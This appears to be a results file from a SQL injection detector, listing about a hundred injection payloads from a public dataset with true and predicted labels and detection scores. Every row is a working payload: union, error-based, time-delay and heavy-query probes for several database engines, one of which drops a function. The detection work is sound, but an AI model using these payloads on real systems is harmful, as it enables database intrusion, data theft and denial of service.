text,source,true_label,pred_label,score_sqli,correct
select  ( case when  ( 9490 = 6134 )  then 9490 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0159703659760275,1
-4768'|| ( select 'dded' from dual where 6499 = 6499 union all select 6499--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.495187131730291,1
select  ( case when  ( 6047 = 8897 )  then 6047 else 6047* ( select 6047 from information_schema.character_sets )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1889522521548863,1
"1"" )  and 3732 = 3850 and  ( ""edjv"" = ""edjv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0950486581072334,1
"1""  )  )   and 7656 = 5604 and   (  (  ""zuhv"" = ""zuhv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.599296019240549,1
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.353349216012393,1
"1%""  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4147445090719986,1
-2817 )  where 1212 = 1212 or 3266 = 1102,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2810303175543525,1
"1'  )  )   )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (   ( 'ichh' like 'ichh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2292775409091012,1
"-1196""  )  )   or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  ""srlq"" = ""srlq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3990717773964203,1
"-4692%""  )  )   union all select 1781,1781#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.8838328348889437,1
1' and 2908 = 8067--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9575111067617387,1
"1"" where 7879 = 7879",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.084556260568415,1
"1""  )  )   as ikuz where 7385 = 7385",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1759483868056861,1
"-1985%'  )  )   )  union all select 3051,3051,3051--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.5421020735153714,1
"1%""  )  )   and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.5183198132112694,1
1 )  as nioj where 9703 = 9703,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0714081597355225,1
"1 )  and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5559709550770786,1
"1' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( 'qutm' = 'qutm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8204963354021921,1
1'  )  )   waitfor delay '0:0:5' and   (  (  'jcfe' = 'jcfe,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9437350511161342,1
"-8966""  )  )   )  or 1628 = 2712",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7089680415353166,1
"1' )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'xdce' = 'xdce",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9150091262514422,1
"1"" )  where 2312 = 2312 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.119204934161235,1
"-2951"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.62650678945819,1
"-7889""  )  )   as oayf where 1765 = 1765 or 8571 = 8571--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9177124379407826,1
if ( 6767 = 5022 )  select 6767 else drop function buii--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9712683510722152,1
"-2601' )  union all select 2866,2866,2866,2866,2866,2866--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.27561515626049,1
"1' )  or elt ( 6272 = 6272,sleep ( 5  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9630877667772881,1
"-1876'|| ( select 'itfc' from dual where 9584 = 9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2280815430320868,1
"-8709"" or 8571 = 8571--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1699061302958822,1
"1%""  )  )   )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8979766538888971,1
"1'  )  )   )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'gmvk' like 'gmvk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3766688228481043,1
"1 )  union all select null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7225783815852647,1
"1', ( select  ( case when  ( 5586 = 6403 )  then 1 else 5586* ( select 5586 from mysql.db )  end  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5815017614096614,1
1 )  where 1487 = 1487,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3085663843508364,1
"select * from generate_series ( 6730,6730,case when  ( 6730 = 9431 )  then 1 else 0 end )  limit 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1784834929509405,1
"-4413%'  )  )   union all select 1345,1345#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.1375757746827,1
"1', ( case when 3598 = 2118 then 1 else null end )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2026959867736386,1
-2920'  )  )   or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'rzey' = 'rzey,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3641329587693463,1
"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and ""cecf"" = ""cecf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7283510309516785,1
"1'+ ( select qymy where 8657 = 8657 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.877192199995875,1
"1"" )  as mwja where 7881 = 7881 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.1379070634821726,1
"1"" )  as uorp where 7208 = 7208",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2306805642820224,1
"-8106%"" )  union all select 2051,2051,2051,2051,2051,2051#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3193179287410168,1
"-5526 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9607994850692365,1
"-3377"" )  or 4982 = 6608#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9056671872787417,1
1' rlike  ( select  ( case when  ( 1916 = 7874 )  then 1 else 0x28 end  )  )   and 'ughq' = 'ughq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2059028934983997,1
1' )  where 2511 = 2511 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.280140728539068,1
-9847%'  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.312090208657771,1
"1""  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( ""tpxo"" like ""tpxo",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.6020748176088846,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0950587306664192,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'jxqf' like 'jxqf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5783774084768942,1
"-1332 )  as qtbb where 7261 = 7261 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.3250083300413906,1
-6145 or  ( 8459 = 8459 ) *4906-- yklv,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.8887898005100688,1
"1"" where 2235 = 2235 union all select null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.324214369518273,1
"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  # qmkh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5197432004070737,1
1%'  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.24231484018344,1
-2604  )  )   as sekb where 6897 = 6897 or 1000 = 7683,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5145967321338247,1
1'  )  )   )  rlike  ( select  ( case when  ( 4076 = 4881 )  then 1 else 0x28 end  )  )   and   (  (   ( 'grzs' = 'grzs,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.021260297804362,1
1'+ ( select 'rejz' where 1530 = 1530 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )    )  )  +',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.0500058286143545,1
1'  )  )   as jbcd where 9078 = 9078 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.074075810894899,1
-6353%'  )  )   or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2361551723606645,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.93365807622766,1
"-8982'+ ( select anyd where 5358 = 5358 union all select 5358,5358,5358,5358,5358,5358#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4388757086186565,1
"1""  )  )   union all select null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.7868005809482854,1
"1' or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.533088123994593,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (  'btnl' = 'btnl",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1827298786115579,1
"-9098'|| ( select 'xodn' from dual where 8202 = 8202 union all select 8202,8202,8202,8202,8202,8202,8202--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9784385938072252,1
"1%' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5994895661122035,1
"1'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'bfrq' like 'bfrq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.440424811998299,1
( select * from  ( select ( sleep ( 5  )  )   ) srmq ) -- mmjk,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8157141647408754,1
"1"" )  as nyui where 2511 = 2511",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1665555660826459,1
"select sleep ( 5 )  and   (  (   ( ""uvzc"" like ""uvzc",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4976456757625116,1
-8010' or  ( 2225 = 8491 ) *8491 and 'eipf' = 'eipf,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.144838403986963,1
"1' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( 'amjh' = 'amjh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8538106626915116,1
"1"" )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""hbfr"" like ""hbfr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3675846918608694,1
1 )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( 6518 = 6518,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.850321866300375,1
"1""  )  )   as dvpb where 6673 = 6673",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.498207122278087,1
select case when 1802 = 7063 then 1 else null end--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2177760422749522,1
"1"" and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and ""krtr"" like ""krtr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8861537173932685,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'nhuk' = 'nhuk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4291123355246333,1
"-6924' )  union all select 2046,2046,2046,2046,2046,2046,2046--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3881746631422285,1
"1'  )  )   and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (  'wcmt' = 'wcmt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.076483592308784,1
"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'cxor' = 'cxor",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.6462823017649146,1
-5113'  )  )   )  or 7200 = 3094--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.022505318474081,1
"1%""  )  )   )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.0178154286520535,1
"1"" or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9804508126996524,1
"1"" )  where 2367 = 2367",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0227607639163772,1
-7707'  )  )   union all select 3172#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.7834144948637505,1
"1 )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( 8600 = 8600",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.019339700952895,1
"1, ( case when 5514 = 9602 then 1 else null end )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2193089094485559,1
"1"" )  where 4905 = 4905 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.008284376543875,1
"end and   (  (  ""cxoi"" = ""cxoi",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1945611409224943,1
"-7627%""  )  )   union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9976187649794869,1
"1  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  5888 = 5888",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.1461194222324003,1
-5708 where 3134 = 3134 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5284652599208943,1
"1 )  and make_set ( 8403 = 8403,8899 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0908233365079232,1
1 )  as ptxw where 9873 = 9873,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.17835260157876,1
1'|| ( select 'jslz' where 8405 = 8405 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo  )  )  ||',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.7576873923539367,1
1  )  )   )  and 4595 = 4595#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7120799360807637,1
"1"" )  where 9093 = 9093",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.210114898239489,1
"1""  )  )   )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.078572558741983,1
"-5211""  )  )   as bkvr where 4082 = 4082 or 2323 = 8052",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.6951308380694972,1
"1'  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  'dgwe' like 'dgwe",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.2918612527211395,1
"1' in boolean mode )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7023286726198434,1
"1' in boolean mode )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9679462390231843,1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and  ( 1491 = 1491",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2004686614204254,1
"1 )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 7182 = 7182",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8457176458860323,1
"1'+ ( select mumb where 4658 = 4658 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.094297619480217,1
